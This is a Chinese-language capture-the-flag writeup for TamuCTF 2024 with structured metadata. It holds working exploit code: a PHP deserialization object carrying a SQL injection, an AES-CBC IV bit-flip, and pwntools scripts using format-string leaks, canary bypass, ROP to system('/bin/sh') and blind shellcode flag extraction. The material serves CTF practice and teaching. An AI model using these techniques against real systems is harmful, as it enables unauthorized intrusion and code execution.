---
title: TamuCTF 2024 Writeup - 狼组安全社区
contest: TamuCTF
year: 2024
team: 狼组安全社区
difficulty: medium
vuln_type: web_unknown
tags: [php-unserialize, sql-injection, cbc-bitflip, fmt-string, blind-shellcode, mmap-xchg-syscall]
attack_chain:
- Cereal (Web): guest 登录 → profile.php 反序列化 → User.__wakeup refresh() 二次注入
- id 字段拼 union select sql from sqlite_master → 触发 SQL 注入
- 4 字段 base64 序列化 Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6Imd1ZXN0IjtzOjI6ImlkIjtzOjU3OiI5OTkndW5pb24gc2VsZWN0IChzZWxlY3Qgc3FsIGZyb20gc3FsaXRlX21hc3RlciksMiwzLDQtLSAiOw==
- admin 密码用 group_concat(password) from users 拿
- Flipped (Web): AES-CBC 翻转字节 iv[0] = 1 ^ 0 → admin: 1
- newiv[i] = (plain[i] ^ iv[i] ^ decode_plain[i])
- Admin Panel (Pwn): 密码处溢出覆盖 format，%15$p 泄 canary, %17$p 泄 libc
- 0x48 padding + canary + rbp + rdi + /bin/sh + system
- Rift (Pwn): fmt 写 6 次改 rbp 链 → rdi_ret + /bin/sh + system
- Confinement (Pwn): sandbox 沙箱 + shellcode 盲注 flag
- mov rdx, {j}; xor dl, [r8-0x1290+{i}]; mov rax, 231 (exit_group); syscall → 退码不同
- 50 字节内 for j in 32..128 爆破
- Five (Pwn): 5 字节 read shellcode：xchg rsi,rdx; syscall 写入 mmap 区域
- Resistant (Reverse): 加密函数动调让 AES/CBC 自动解密
- key/iv 异或后提取数据
key_payload: newiv[i] = plain[i] ^ iv[i] ^ decode_plain[i]
one_liner: TamuCTF 2024 狼组：Web 反序列化+SQL注入+CBC翻转 + Pwn fmt+canary+sandbox 盲注 + Reverse AES 动调。
lesson: AES-CBC IV 翻转是经典 admin 0→1 trick；sandbox 沙箱 + shellcode 时用 exit_group 退码盲注 flag 字符。
quality: high
---
# TamuCTF 2024 Writeup - 狼组安全社区

## Web

### 1. Cereal (PHP 反序列化 + SQL 注入)
- `guest:guest` 登录
- `profile.php` 反序列化入口
- `config.php` User 类 `__wakeup` 调 `refresh()` → 二次 SQL 注入
- 注入 payload:
```php
O:4:"User":4:{
    s:8:"username";s:5:"guest";
    s:2:"id";s:57:"999' union select (select sql from sqlite_master),2,3,4-- ";
    s:11:"*password";s:32:"5f4dcc3b5aa765d61d8327deb882cf99";
    s:10:"*profile";N;
}
```
- 改 id 字段为 `group_concat(password) from users` 拿 admin 密码

### 2. Flipped (AES-CBC 翻转)
- Flask session `{"admin": 0, "username": "guest"}`
- AES-CBC 加密 + 随机 IV
- 16 字节分块，admin 在第一组
- 翻转 IV 第一字节使 `0` → `1`:
```python
newiv[i] = ord(plain[i]) ^ iv[i] ^ ord(decode_plain[i])
```

### 3. Forgotten Password
- 传数组 `[existing_user, my_email]` 让服务器发送密码到自己的邮箱

## Pwn

### 4. Admin Panel
```python
io.recvuntil(b"length 24:\n")
p = b"secretpass123".ljust(0x20, b"A") + b"%15$p-%17$p"
io.sendline(p)
io.recvuntil("admin\n")
canary = int(io.recvuntil(b"-", drop=True), 16)
__libc_start_main = int(io.recv(14), 16) - 235
libc_base = __libc_start_main - libc.sym['__libc_start_main']
sys_addr = libc_base + libc.sym['system']
sh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
rdi_ret = libc_base + 0x23a5f

io.recvuntil(b"1, 2 or 3:")
io.sendline(b"2")
io.recvuntil(b"went wrong:")
p = b"A"*0x48 + p64(canary) + b"A"*8 + p64(rdi_ret) + p64(sh_addr) + p64(sys_addr)
io.sendline(p)
io.sendline(b"3")
io.sendline(b"cat flag*")
```

### 5. Rift (fmt-string 改 rbp 链)
```python
io.sendline(b"%9$p-%11$p-%13$p.")
pie = int(io.recvuntil(b"-", drop=True)[-14:], 16) - 24 - elf.sym['main']
__libc_start_main = int(io.recvuntil(b"-", drop=True), 16) - 235
libc_base = __libc_start_main - libc.sym['__libc_start_main']
rbp = int(io.recv(14), 16) - 0xf8
rdi_ret = pie + 0x127b

def fmt(addr, data):
    io.sendlineafter(b".\n", f"%{(addr)&0xffff}c%13$hn.")
    io.sendlineafter(b".\n", f"%{(data)&0xffff}c%39$hn.")
    # ... 3 次写 2 字节 (覆盖 6 字节)

fmt(rbp+0x8, rdi_ret)
fmt(rbp+0x10, sh_addr)
fmt(rbp+0x18, sys_addr)
io.sendlineafter(b".\n", f"%{(rbp-4)&0xffff}c%13$hn.")
io.sendlineafter(b".\n", "%39$hn")
io.sendline(b"cat flag*")
```

### 6. Confinement (sandbox 盲注)
```python
# shellcode 注入后：
# mov rdx, {j}
# xor dl, byte ptr [r8-0x1290+{i}]
# mov rax, 231 (exit_group)
# mov rdi, rdx
# syscall
# → 用 flag 字符 XOR 后调 exit_group，ret code 不同

flag = ""
for i in range(50):
    for j in range(32, 128):
        io = remote(...)
        p = b"\x48\xC7\xC2" + p8(j) + b"\x00\x00\x00\x41\x32\x90" + p8(0x70+i)
        p += b"\xED\xFF\xFF\x48\xC7\xC0\xE7\x00\x00\x00\x48\x89\xD7\x0F\x05"
        io.sendline(p)
        if b"adios" in io.recv():
            flag += chr(j)
            break
        io.close()
```

### 7. Five (5 字节 read shellcode)
```python
shellcode_x64 = asm(shellcraft.amd64.sh())
'''
xchg rsi, rdx
syscall
'''
# 5 字节触发 read(0, mmap_area, 0x1000) → 写完整 shellcode
io.sendline(b"\x90"*5 + shellcode_x64)
io.sendline(b"cat flag*")
```

## Reverse
### 8. Resistant
函数被加密，IDA 动调让 AES/CBC 自动解密；提取 key+iv 异或结果，在线解密。
